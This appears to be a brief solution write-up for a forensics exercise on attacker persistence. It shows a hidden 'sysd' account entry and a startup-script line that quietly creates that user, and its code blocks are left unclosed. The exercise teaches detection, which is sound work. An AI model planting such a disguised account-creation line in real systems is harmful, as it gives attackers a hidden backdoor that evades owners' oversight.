# Persistence - Solution

## Task
Identify how the attacker maintained persistent access to the system.

---

## Analysis

### 1. Hidden User
The `users.txt` file reveals a suspicious account:
```plaintext
sysd:x:1004:1004:System Daemon:/tmp:/bin/bash

### 2. Startup Script
The `startup.sh` file contains a malicious line:
```bash
useradd -M -d /tmp -s /bin/bash sysd 2>/dev/null || echo "User sysd already exists"

